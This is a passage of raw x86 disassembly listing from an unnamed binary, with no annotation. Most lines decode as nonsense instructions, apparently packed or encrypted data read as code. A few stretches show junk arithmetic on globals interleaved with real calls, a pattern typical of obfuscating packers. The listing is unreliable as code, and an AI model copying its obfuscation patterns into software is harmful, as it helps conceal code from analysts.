  4071df:	cmp    DWORD PTR [eax-0x2371ed68],edx
  4071e5:	cmp    eax,0x80ee1833
  4071ea:	mov    bh,0xaa
  4071ec:	inc    ebp
  4071ed:	push   0xa28a0a64
  4071f2:	xchg   eax,edi
  4071f4:	repz sti 
  4071f6:	jno    0x407222
  4071f8:	dec    edi
  4071f9:	je     0x407276
  4071fb:	xchg   esp,eax
  4071fc:	cdq    
  4071fd:	and    DWORD PTR [edx+0x3515905d],ebp
  407203:	sub    al,ch
  407205:	enter  0x54c,0xec
  407209:	mov    esi,0xaa6c3ecb
  40720e:	jo     0x40728d
  407210:	xchg   DWORD PTR [eax-0x69493eb6],esp
  407216:	cmc    
  407217:	lds    esp,FWORD PTR [ebp-0x57c66821]
  40721d:	frstor [edx+0x3d]
  407220:	test   esp,edx
  407222:	test   eax,0x93ee92ba
  407227:	out    dx,al
  407228:	or     eax,0x79c3c257
  40722d:	in     al,dx
  40722e:	or     al,0x9e
  407230:	push   ds
  407231:	add    DWORD PTR [esi-0x68],edi
  407234:	cmp    eax,0xfe4eddaa
  407239:	test   bl,al
  40723b:	push   ds
  40723c:	inc    sp
  40723e:	stos   DWORD PTR es:[edi],eax
  40723f:	inc    esi
  407240:	dec    esp
  407241:	push   es
  407242:	mov    ds:0x6c649649,al
  407247:	shl    DWORD PTR [ecx],0xe5
  40724a:	push   ds
  40724b:	int3   
  40724c:	stc    
  40724d:	xor    ah,al
  40724f:	mov    ch,0x5e
  407251:	push   ds
  407252:	aas    
  407253:	mov    ds:0x1c0880f7,al
  407258:	xor    eax,0xf6f86c28
  40725d:	ficom  DWORD PTR [ebp-0x3f]
  407260:	mov    ds:0xb30167aa,al
  407265:	fistp  QWORD PTR [esi-0x318bb88b]
  40726b:	repz into 
  40726d:	jnp    0x407270
  40726f:	arpl   WORD PTR [edx],di
  407271:	loop   0x4071f6
  407273:	or     DWORD PTR [esi-0x4e1195c9],edx
  407279:	dec    esp
  40727a:	xchg   ecx,eax
  40727b:	leave  
  40727c:	xchg   ebp,eax
  40727d:	fs jnp 0x4072f7
  407280:	pop    ebx
  407281:	mov    dl,0x3e
  407283:	mov    ebp,0x60461f1f
  407288:	xchg   edi,eax
  407289:	sub    eax,0xba4a8f7d
  40728e:	fidiv  DWORD PTR [eax]
  407290:	mov    al,0x7
  407292:	pop    es
  407293:	add    BYTE PTR [ebx],0x22
  407296:	aad    0x98
  407298:	das    
  407299:	mov    ds,WORD PTR [ebx-0x21]
  40729c:	rcr    BYTE PTR ds:0xad92145d,cl
  4072a2:	rol    DWORD PTR [ebx],1
  4072a4:	xchg   BYTE PTR [ebx],dl
  4072a6:	xor    edi,DWORD PTR [esi-0x29]
  4072a9:	sbb    ah,bh
  4072ab:	mov    esp,0xd4d0b360
  4072b0:	shl    DWORD PTR [eax+0x78f12611],cl
  4072b6:	xchg   ebx,eax
  4072b7:	in     al,0xf9
  4072b9:	lods   eax,DWORD PTR ds:[esi]
  4072ba:	rcr    BYTE PTR ds:0xb8976fdb,cl
  4072c0:	stos   DWORD PTR es:[edi],eax
  4072c1:	lock daa 
  4072c3:	fist   WORD PTR [edi+esi*1]
  4072c6:	inc    ebp
  4072c7:	jg     0x407264
  4072c9:	jae    0x407271
  4072cb:	or     DWORD PTR [ebp+0x64a16300],ecx
  4072d1:	outs   dx,BYTE PTR ds:[esi]
  4072d2:	loopne 0x407329
  4072d4:	xchg   ebp,eax
  4072d5:	stos   DWORD PTR es:[edi],eax
  4072d6:	data16 jp 0x4072b3
  4072d9:	sub    al,0x9d
  4072db:	inc    edi
  4072dc:	(bad)  
  4072dd:	pop    esp
  4072de:	jbe    0x407329
  4072e0:	inc    esi
  4072e1:	xchg   ebx,eax
  4072e2:	sub    edx,DWORD PTR [ebp-0x6f]
  4072e5:	mov    BYTE PTR [ebp+0x495330ba],ah
  4072eb:	je     0x4072e7
  4072ed:	sbb    dl,BYTE PTR ds:0x7e4611ab
  4072f3:	mov    ch,0x8d
  4072f5:	aam    0xa5
  4072f7:	inc    eax
  4072f8:	cli    
  4072f9:	sbb    al,0x25
  4072fb:	jmp    0x971f9fdf
  407300:	inc    ecx
  407301:	loopne 0x4072c6
  407303:	sbb    ecx,DWORD PTR [ebx]
  407305:	lods   al,BYTE PTR ds:[esi]
  407306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407307:	jmp    0x4072c2
  407309:	pop    esp
  40730a:	lea    esp,[edx+0xb]
  40730d:	ret    
  40730e:	push   ecx
  40730f:	xor    BYTE PTR [ecx-0x182341f9],dh
  407315:	fwait
  407316:	in     al,0x64
  407318:	sub    bl,cl
  40731a:	aad    0xc5
  40731c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40731d:	fwait
  40731e:	push   ebp
  40731f:	dec    ebx
  407320:	movmskps ebp,xmm2
  407323:	pop    edi
  407324:	push   ebp
  407325:	mov    bl,0x8a
  407327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407328:	pop    edx
  407329:	clc    
  40732a:	ss and eax,0xf4e28316
  407330:	dec    ecx
  407331:	mov    ebx,0xb232a4f9
  407336:	jnp    0x407316
  407338:	xor    eax,0xbb645498
  40733d:	iret   
  40733e:	sub    BYTE PTR [eax-0x52dc02d4],cl
  407344:	push   0xe
  407346:	cmp    cl,BYTE PTR [ebx+0x581f445]
  40734c:	sar    ebp,1
  40734e:	inc    edx
  40734f:	add    BYTE PTR [ebx],al
  407351:	call   0xc6737398
  407356:	add    DWORD PTR ds:0x42fdfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e80f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fdfd,0x0
  407384:	mov    eax,ds:0x42fdfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fdfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fdfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e55f
  4073a2:	cmp    DWORD PTR ds:0x42fdfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fdfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fdfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fdfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e228,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e807,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	mov    ch,0xb0
  4073fd:	cdq    
  4073fe:	fwait
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	scas   eax,DWORD PTR es:[edi]
  407408:	xchg   ebp,eax
  407409:	in     al,0x8e
  40740b:	cmp    al,0xa
  40740d:	retf   
  40740e:	imul   edi,DWORD PTR [ebx+0x584178e0],0x2e
  407415:	pushf  
  407416:	sbb    ecx,ecx
  407418:	lock clc 
  40741a:	ds sub al,0xd7
  40741d:	add    al,BYTE PTR [ebp-0x27]
  407420:	fsub   QWORD PTR [esi]
  407422:	aas    
  407423:	imul   edx,DWORD PTR [edx],0xc0d35d31
  407429:	jo     0x4073e7
  40742b:	dec    ebp
  40742c:	xlat   BYTE PTR ds:[ebx]
  40742d:	mov    ebx,0x5f7220cb
  407432:	mul    BYTE PTR [eax-0x34]
  407435:	sbb    ah,al
  407437:	pop    ebp
  407438:	mov    bl,BYTE PTR [ebx]
  40743a:	xchg   esi,eax
  40743b:	call   0x447dd8cf
  407440:	loope  0x407434
  407442:	fcomp  DWORD PTR [ebx]
  407444:	pop    ds
  407445:	lds    eax,FWORD PTR [esi]
  407447:	sbb    BYTE PTR [ecx+0x4b2293fe],bh
  40744d:	pop    ecx
  40744e:	jg     0x407416
  407450:	xchg   BYTE PTR ds:0x77facd8b,bl
  407456:	test   BYTE PTR [edx-0x39],bl
  407459:	popa   
  40745a:	or     BYTE PTR [ebp*1-0x15f187b2],bh
  407461:	add    DWORD PTR [eax-0x38],ebx
  407464:	retf   
  407465:	mov    esi,esi
  407467:	pop    ebp
  407468:	lods   eax,DWORD PTR ds:[esi]
  407469:	ror    BYTE PTR [ebx*4-0x188ccb03],1
  407470:	pop    es
  407471:	mov    bh,0xd9
  407473:	loop   0x40745c
  407475:	mov    bh,0x7d
  407477:	leave  
  407478:	ss scas eax,DWORD PTR es:[edi]
  40747a:	xchg   ebp,eax
  40747b:	into   
  40747c:	jae    0x40747b
  40747e:	inc    edi
  40747f:	stos   DWORD PTR es:[edi],eax
  407480:	mov    al,ds:0xdd076eed
  407485:	push   edi
  407486:	jecxz  0x4074a3
  407488:	pop    ecx
  407489:	fisttp WORD PTR [edi]
  40748b:	(bad)  
  40748c:	fnsave [eax+0xeadf7f4]
  407492:	dec    ebx
  407493:	push   es
  407494:	(bad)  
  407495:	mov    ch,0x90
  407497:	nop
  407498:	adc    DWORD PTR [esp+ebx*4+0x31],eax
  40749c:	fdiv   st(3),st
  40749e:	pop    es
  40749f:	loop   0x40748f
  4074a1:	jbe    0x4074ed
  4074a3:	inc    edx
  4074a4:	pop    es
  4074a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a6:	mov    ecx,0x2b1a12fd
  4074ab:	push   es
  4074ac:	inc    ebp
  4074ad:	mov    ch,0x4d
  4074af:	inc    esp
  4074b0:	pop    esi
  4074b1:	(bad)  
  4074b2:	leave  
  4074b3:	scas   al,BYTE PTR es:[edi]
  4074b4:	adc    eax,0x75035812
  4074b9:	lahf   
  4074ba:	icebp  
  4074bb:	int3   
  4074bc:	pop    esp
  4074bd:	out    dx,eax
  4074be:	pop    edx
  4074bf:	lods   eax,DWORD PTR ds:[esi]
  4074c0:	add    eax,0xcb2804fb
  4074c5:	jmp    DWORD PTR [esi-0x6f179e9a]
  4074cb:	clc    
  4074cc:	sbb    bh,0x13
  4074cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d0:	pop    esp
  4074d1:	(bad)  
  4074d2:	out    0x6f,al
  4074d4:	jmp    0x2319:0xabd000f8
  4074db:	int3   
  4074dc:	mov    ebx,0x9b84d60d
  4074e1:	imul   ebx,edx,0xffffffbc
  4074e4:	clc    
  4074e5:	(bad)  
  4074e6:	jne    0x4074ce
  4074e8:	sub    DWORD PTR [edx+0x2b614ed2],edi
  4074ee:	xor    DWORD PTR [esi],eax
  4074f0:	loopne 0x407533
  4074f2:	xor    al,0x82
  4074f4:	pushf  
  4074f5:	(bad)  
  4074f6:	sub    cl,BYTE PTR [esi-0x76]
  4074f9:	fimul  DWORD PTR [ebp+ecx*8+0x5859e0a]
  407500:	(bad)  
  407502:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407504:	jmp    FWORD PTR [ecx-0x544050d]
  40750a:	dec    edi
  40750b:	and    ebx,edi
  40750d:	imul   ecx,edx,0xfffffffd
  407510:	sub    ch,BYTE PTR [ebx]
  407512:	cmp    dh,al
  407514:	dec    ebx
  407515:	xchg   ecx,eax
  407516:	repnz sbb al,0x47
  407519:	dec    esp
  40751a:	dec    ecx
  40751b:	cmp    bl,bh
  40751d:	pushf  
  40751e:	push   esp
  40751f:	jmp    0x2806:0x21f429eb
  407526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407527:	lock js 0x40753e
  40752a:	pop    ebp
  40752b:	pop    ecx
  40752c:	adc    dl,ah
  40752e:	mov    edi,0x44cba844
  407533:	pop    ecx
  407534:	shr    dl,1
  407536:	mov    esi,0xbc23ba35
  40753b:	dec    esp
  40753c:	sub    esi,ebp
  40753e:	icebp  
  40753f:	mov    edi,0xeb312b76
  407544:	dec    eax
  407545:	inc    esp
  407546:	fwait
  407547:	mov    dh,0xd8
  407549:	inc    edi
  40754a:	aaa    
  40754b:	sbb    BYTE PTR ds:0x879366f8,ch
  407551:	std    
  407552:	idiv   BYTE PTR [edx-0x61]
  407555:	jle    0x4075d5
  407557:	mov    fs:0x281e2e40,eax
  40755d:	fbstp  TBYTE PTR [eax]
  40755f:	add    dl,BYTE PTR [ebx+0x5d]
  407562:	out    0x14,eax
  407564:	call   0x15d7:0xe15fd98c
  40756b:	pop    es
  40756c:	jmp    0x5884:0x85e79f3f
  407573:	scas   al,BYTE PTR es:[edi]
  407574:	dec    eax
  407575:	hlt    
  407576:	cmp    esi,DWORD PTR [ebx]
  407578:	mov    cl,0xb5
  40757a:	jp     0x4075d7
  40757c:	outs   dx,DWORD PTR ds:[esi]
  40757d:	je     0x4075ea
  40757f:	mov    dl,0x7c
  407581:	mov    ecx,0x3833fee9
  407586:	dec    esp
  407587:	mov    esi,0xc0aaef50
  40758c:	jg     0x407579
  40758e:	adc    bl,al
  407590:	aad    0x87
  407592:	add    dl,dh
  407594:	mov    edi,0x25bf85eb
  407599:	push   es
  40759a:	cld    
  40759b:	pop    ds
  40759c:	fdiv   QWORD PTR [esi]
  40759e:	adc    DWORD PTR [eax+0x41062610],esi
  4075a4:	mov    WORD PTR [ebp-0x27],ds
  4075a7:	push   cs
  4075a8:	fcom   QWORD PTR [esi-0x12030196]
  4075ae:	test   BYTE PTR [eax-0x33fae8e],al
  4075b4:	pusha  
  4075b5:	and    DWORD PTR [ecx],esi
  4075b7:	push   ds
  4075b8:	(bad)  
  4075b9:	xchg   ecx,eax
  4075ba:	arpl   WORD PTR [eax+0x7d],si
  4075bd:	jae    0x407546
  4075bf:	test   DWORD PTR [ecx-0x3f],eax
  4075c2:	inc    ecx
  4075c3:	call   0x1c325f4b
  4075c8:	xchg   ebx,eax
  4075c9:	div    bh
  4075cb:	xor    eax,0x6cd8fd8b
  4075d0:	jbe    0x407584
  4075d2:	jecxz  0x407611
  4075d4:	mov    esi,0xdf9edc2d
  4075d9:	mov    al,0x78
  4075db:	sub    BYTE PTR ds:0x7975ec5,dh
  4075e1:	push   ds
  4075e2:	inc    ecx
  4075e3:	fs mov bl,0xec
  4075e6:	xor    eax,0x7f2a1513
  4075eb:	fidiv  WORD PTR [eax-0x39]
  4075ee:	mov    ebx,0xdca003e8
  4075f3:	das    
  4075f4:	mov    ah,0xb6
  4075f6:	xchg   ecx,eax
  4075f7:	lods   al,BYTE PTR ds:[esi]
  4075f8:	scas   al,BYTE PTR es:[edi]
  4075f9:	jno    0x4075e9
  4075fb:	adc    DWORD PTR [ecx],esp
  4075fd:	mov    esi,DWORD PTR [edi+ebx*2-0x67edd6bf]
  407604:	cmp    eax,0xf9c67a3c
  407609:	xchg   esi,eax
  40760a:	repnz inc ebx
  40760c:	xor    al,0xed
  40760e:	or     edx,DWORD PTR [esi]
  407610:	div    DWORD PTR [eax+0x2c17ac1d]
  407616:	xchg   ebx,eax
  407617:	ins    DWORD PTR es:[edi],dx
  407618:	outs   dx,DWORD PTR ds:[esi]
  407619:	mov    ebp,0x428adc7b
  40761e:	sub    cl,al
  407620:	dec    edx
  407621:	adc    ebx,edi
  407623:	xor    cl,BYTE PTR [ecx-0x1c]
  407626:	shl    BYTE PTR [eax+0x7ea31bfd],0x5
  40762d:	pusha  
  40762e:	jmp    0xca37e280
  407633:	mov    DWORD PTR [edi],edi
  407635:	icebp  
  407636:	bound  ebx,QWORD PTR [esi+0x4]
  407639:	push   ss
  40763a:	pop    edx
  40763b:	xor    DWORD PTR [edi-0x6dc6ac44],ecx
  407641:	sbb    al,0x5d
  407643:	ins    BYTE PTR es:[edi],dx
  407644:	mov    ah,BYTE PTR [ecx+0xb283e83]
  40764a:	add    DWORD PTR [ebx],0x8fda7004
  407650:	cwde   
  407651:	jmp    0x407649
  407653:	bound  esi,QWORD PTR [edi+0x3b765fe2]
  407659:	pop    edx
  40765a:	sahf   
  40765b:	sbb    al,0xa0
  40765d:	pop    edx
  40765e:	call   0x813d14da
  407663:	mov    ah,0x4a
  407665:	test   DWORD PTR [ebx+0x4b0c9b84],edi
  40766b:	je     0x4076d8
  40766d:	cwde   
  40766e:	out    dx,al
  40766f:	fistp  QWORD PTR [ecx-0x51]
  407672:	ds dec ebx
  407674:	lds    ebx,FWORD PTR [edi-0x2c1e5a1c]
  40767a:	lea    ebp,[ebx-0x70]
  40767d:	mov    BYTE PTR [edx+0x2b7bdac7],bh
  407683:	fst    DWORD PTR [edx+0x147598f4]
  407689:	cmp    eax,0x8d50514e
  40768e:	popf   
  40768f:	sub    esi,DWORD PTR [ebx-0x1a1afcc]
  407695:	in     eax,dx
  407696:	iret   
  407697:	mov    cl,0x84
  407699:	cwde   
  40769a:	adc    bh,BYTE PTR [edi-0x2b]
  40769d:	mov    eax,0xc4198ee4
  4076a2:	test   eax,0x6309032f
  4076a7:	(bad)  
  4076a8:	cmp    eax,0x9d1d8e87
  4076ad:	sub    BYTE PTR [edx+0x18810be3],0xd1
  4076b4:	xor    bl,BYTE PTR [edi-0x6e621296]
  4076ba:	push   eax
  4076bb:	mov    edx,0x55ce3bcd
  4076c0:	or     eax,0xde85dc10
  4076c5:	mov    edi,0xf0b8722c
  4076ca:	pop    ecx
  4076cb:	ds mov bl,cl
  4076ce:	inc    ecx
  4076cf:	stc    
  4076d0:	xchg   edx,eax
  4076d1:	mov    ah,0x72
  4076d3:	aaa    
  4076d4:	xchg   ecx,eax
  4076d5:	cli    
  4076d6:	pop    esp
  4076d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d8:	sbb    ebx,DWORD PTR [esi+eax*2]
  4076db:	jnp    0x4076a2
  4076dd:	lods   eax,DWORD PTR ds:[esi]
  4076de:	gs push eax
  4076e0:	aaa    
  4076e1:	mov    ebp,0x4a05fc19
  4076e6:	push   edi
  4076e7:	jp     0x40773d
  4076e9:	dec    ecx
  4076ea:	sub    esp,edi
  4076ec:	sbb    eax,DWORD PTR [ebx-0x1dd04810]
  4076f2:	test   BYTE PTR [edi+0x71f7c79b],bh
  4076f8:	push   0xa75ca908
  4076fd:	xor    edx,ecx
  4076ff:	cld    
  407700:	test   DWORD PTR [ebx-0x58],0x69a08717
  407707:	fsubr  st(0),st
  407709:	sub    BYTE PTR [eax+0x241df8a],dl
  40770f:	out    0xcf,eax
  407711:	jo     0x407731
  407713:	sub    ch,BYTE PTR [edi-0x5b1e7686]
  407719:	cmp    esi,DWORD PTR [edi-0x15]
  40771c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40771d:	in     al,dx
  40771e:	inc    eax
  40771f:	push   ebx
  407720:	dec    ebx
  407721:	icebp  
  407722:	pop    ecx
  407723:	arpl   WORD PTR [edx],dx
  407725:	test   BYTE PTR [ecx],al
  407727:	fcom   QWORD PTR [eax]
  407729:	sub    dl,ah
  40772b:	jp     0x40774e
  40772d:	fbstp  TBYTE PTR [edi+edi*8+0x7e]
  407731:	cs mov edi,0x77750a2c
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e21c,0x42fe09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fdd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e7ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fdf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e80f,0x42e7eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e7ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e803,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fde5,0x42fe6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	xchg   esi,eax
  4077da:	sbb    ebx,DWORD PTR ds:0x70cca747
  4077e0:	jo     0x407802
  4077e2:	jge    0x407854
  4077e4:	jo     0x40785c
  4077e6:	dec    esi
  4077e7:	push   edi
  4077e8:	iret   
  4077e9:	and    DWORD PTR [eax-0x25931471],eax
  4077ef:	sub    edi,0xe550b186
  4077f5:	(bad)  
  4077f6:	stos   DWORD PTR es:[edi],eax
  4077f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077f8:	or     al,BYTE PTR [ecx-0x7b]
  4077fb:	jb     0x4077e5
  4077fd:	imul   di,WORD PTR [ebx+edi*1+0x123c3c62],0x31
  407806:	jbe    0x40787f
  407808:	push   ebx
  407809:	test   DWORD PTR [ebx+0x4d],esp
  40780c:	popf   
  40780d:	repz retf 0xa5a5
  407811:	push   eax
  407812:	and    ebp,esp
  407814:	in     al,dx
  407815:	xchg   ebx,eax
  407816:	adc    al,0x37
  407818:	jmp    0xb49b2b90
  40781d:	aam    0xe
  40781f:	mov    ebp,0xb9f166a4
  407824:	pop    edx
  407825:	out    0x99,al
  407827:	push   es
  407828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407829:	mov    fs,ebp
  40782b:	mov    bh,0x75
  40782d:	sbb    al,ah
  40782f:	int3   
  407830:	test   esi,edi
  407832:	xor    esi,DWORD PTR [ecx+0x3619bfe7]
  407838:	or     DWORD PTR [ebp-0x21efb052],ebp
  40783e:	lock add eax,0x636c1f92
  407844:	xchg   DWORD PTR [ebp+0x3e90d4b7],ebp
  40784a:	(bad)
  40784d:	mov    esi,0x2a836cf5
  407852:	or     al,0x47
  407854:	inc    eax
  407855:	cmc    
  407856:	sbb    DWORD PTR [ebp+eiz*1+0x777a3049],esp
  40785d:	sbb    ah,bh
  40785f:	outs   dx,BYTE PTR ds:[esi]
  407860:	xlat   BYTE PTR ds:[ebx]
  407862:	dec    eax
  407863:	push   0xbb187acd
  407868:	push   cs
  407869:	xchg   edx,eax
  40786a:	push   eax
  40786b:	arpl   WORD PTR [edi],ax
  40786d:	cli    
  40786e:	inc    edx
  40786f:	lea    eax,[ebx+ecx*2]
  407872:	inc    esi
  407873:	mov    ecx,ds
  407875:	(bad)  
  407876:	loop   0x40783f
  407878:	sti    
  407879:	mov    cl,0xdf
  40787b:	mov    DWORD PTR [edx+eiz*4+0x7602ded8],edi
  407882:	fsub   st(0),st
  407884:	ret    0x2b7
  407887:	scas   eax,DWORD PTR es:[edi]
  407888:	es leave 
  40788a:	pop    ecx
  40788b:	or     DWORD PTR [edx],esi
  40788d:	pop    ds
  40788e:	xchg   edx,eax
  40788f:	cmp    BYTE PTR [esi],bl
  407891:	icebp  
  407892:	xchg   edx,eax
  407893:	and    al,0x9c
  407895:	adc    bh,ch
  407897:	xchg   esp,eax
  407898:	inc    eax
  407899:	and    edx,DWORD PTR ds:0xea7bcde0
  40789f:	sbb    BYTE PTR [edi],bh
  4078a1:	sub    DWORD PTR [ecx+0x1542338b],0xffffffb7
  4078a8:	call   FWORD PTR [ebp+0x22]
  4078ab:	test   DWORD PTR [eax+edi*8],esp
  4078ae:	pop    ss
  4078af:	call   0x8e41b74e
  4078b4:	xchg   ecx,eax
  4078b5:	add    DWORD PTR [edx+0x42],esp
  4078b8:	push   cs
  4078b9:	sbb    BYTE PTR [ebp-0x47],dl
  4078bc:	in     al,0x14
  4078be:	rcr    bl,cl
  4078c0:	push   ebp
  4078c1:	iret   
  4078c2:	repz call 0xe7cd28fd
  4078c8:	cld    
  4078c9:	sbb    BYTE PTR [edi],0x76
  4078cc:	sti    
  4078cd:	dec    eax
  4078ce:	outs   dx,DWORD PTR ds:[esi]
  4078cf:	in     al,dx
  4078d0:	push   0xffffffbd
  4078d2:	jecxz  0x407947
  4078d4:	rcr    DWORD PTR [ecx+eiz*8+0x62709773],0x58
  4078dc:	push   eax
  4078dd:	push   esi
  4078de:	imul   edx,DWORD PTR [ebx+0x33],0x4a
  4078e2:	xchg   ebx,eax
  4078e3:	shr    DWORD PTR [edi-0x6b],0x3c
  4078e7:	pop    ds
  4078e8:	mov    dl,0xd7
  4078ea:	fistp  WORD PTR [esi-0x442c59ff]
  4078f0:	loopne 0x4078bf
  4078f2:	jns    0x40795a
  4078f4:	cld    
  4078f5:	or     BYTE PTR [ebp+0xb],cl
  4078f8:	call   0xb9d9a364
  4078fd:	xor    ebp,DWORD PTR [ecx]
  4078ff:	(bad)  
  407900:	cdq    
  407901:	retf   0xfc47
  407904:	jmp    0x1200:0x443c1056
  40790b:	lods   eax,DWORD PTR ds:[esi]
  40790c:	bound  ebx,QWORD PTR [edx-0x13]
  40790f:	es popf 
  407911:	fbstp  TBYTE PTR [edx]
  407913:	(bad)  
  407914:	cld    
  407915:	xor    edi,esi
  407917:	pop    eax
  407918:	int3   
  407919:	lods   eax,DWORD PTR ds:[esi]
  40791a:	scas   eax,DWORD PTR es:[edi]
  40791b:	add    eax,0x81c41ef5
  407920:	mov    ebp,0x549cab2a
  407925:	xchg   esi,eax
  407926:	cmp    esp,edi
  407928:	xlat   BYTE PTR ds:[ebx]
  407929:	add    ecx,DWORD PTR [edx+edx*1+0x18]
  40792d:	cld    
  40792e:	pop    ebp
  40792f:	arpl   WORD PTR [eax-0x1b],sp
  407932:	cdq    
  407933:	jno    0x40796a
  407935:	xor    eax,DWORD PTR [eax-0x16]
  407938:	xor    al,0x19
  40793a:	imul   DWORD PTR [esi+ecx*8+0x3d5f4969]
  407941:	out    0x9d,al
  407943:	shl    BYTE PTR [eax+0x7202cfea],cl
  407949:	or     eax,0xc7f8c63e
  40794e:	cmp    BYTE PTR [edi-0x540d8882],ah
  407954:	fwait
  407955:	pop    es
  407956:	cmp    DWORD PTR [esi],esi
  407958:	mov    bl,bl
  40795a:	mov    dh,0x48
  40795c:	adc    BYTE PTR [ebx-0x74],dh
  40795f:	jbe    0x4078e1
  407961:	ret    
  407962:	push   0xffffff86
  407964:	fild   DWORD PTR [esi-0x29]
  407967:	add    ebx,esi
  407969:	add    al,0x13
  40796b:	jae    0x4079a5
  40796d:	(bad)  
  40796e:	cmovo  edx,esp
  407971:	pop    ebx
  407972:	out    0x38,al
  407974:	test   eax,0x4bc53c9b
  407979:	mov    bl,0xfb
  40797b:	jo     0x4079ea
  40797d:	into   
  40797e:	sub    DWORD PTR [edi],esi
  407980:	mov    bh,0x51
  407982:	in     al,0x4a
  407984:	loope  0x4079ee
  407986:	push   ecx
  407987:	imul   ecx,DWORD PTR [edx-0x25],0xffffffd0
  40798b:	popa   
  40798c:	push   ss
  40798d:	pusha  
  40798e:	push   edi
  40798f:	jno    0x40793a
  407991:	aaa    
  407992:	ss mov ecx,0x19461c6b
  407998:	call   DWORD PTR [esp+ecx*1-0x73]
  40799c:	(bad)  
  40799d:	pop    esi
  40799e:	dec    ecx
  40799f:	(bad)  
  4079a0:	pusha  
  4079a1:	popf   
  4079a2:	sbb    eax,0x4fe97fa7
  4079a7:	popa   
  4079a8:	enter  0x2f2a,0x7d
  4079ac:	scas   al,BYTE PTR es:[edi]
  4079ad:	dec    ecx
  4079ae:	push   edx
  4079af:	cli    
  4079b0:	ins    BYTE PTR es:[edi],dx
  4079b1:	fimul  DWORD PTR [esi]
  4079b3:	push   es
  4079b4:	dec    eax
  4079b5:	jne    0x4079b4
  4079b7:	int3   
  4079b8:	sbb    DWORD PTR [ebx+ecx*8],edx
  4079bb:	popf   
  4079bc:	aam    0x3a
  4079be:	pop    ds
  4079bf:	xchg   esi,eax
  4079c0:	je     0x4079a9
  4079c2:	jl     0x407976
  4079c4:	or     cl,ah
  4079c6:	inc    ecx
  4079c7:	retf   0xc526
  4079ca:	mov    eax,0xae7a8ce8
  4079cf:	outs   dx,DWORD PTR ds:[esi]
  4079d0:	dec    esi
  4079d1:	fmul   QWORD PTR [edi+0x6f271eee]
  4079d7:	ds inc esp
  4079d9:	cmp    al,0x9e
  4079db:	add    DWORD PTR [esi],edx
  4079dd:	jecxz  0x407a4c
  4079df:	daa    
  4079e0:	mov    WORD PTR [esi-0x2d60b186],cs
  4079e6:	outs   dx,BYTE PTR ds:[esi]
  4079e7:	fs cmc 
  4079e9:	hlt    
  4079ea:	jl     0x4079e0
  4079ec:	pop    es
  4079ed:	ins    BYTE PTR es:[edi],dx
  4079ee:	ds popa 
  4079f0:	adc    dl,BYTE PTR [eax-0x4d]
  4079f3:	pop    ecx
  4079f4:	lock or DWORD PTR [eax],eax
  4079f7:	retf   
  4079f8:	in     eax,dx
  4079f9:	dec    ecx
  4079fa:	mov    bh,0xe2
  4079fc:	sub    eax,0x2f23eec
  407a01:	push   ebp
  407a02:	leave  
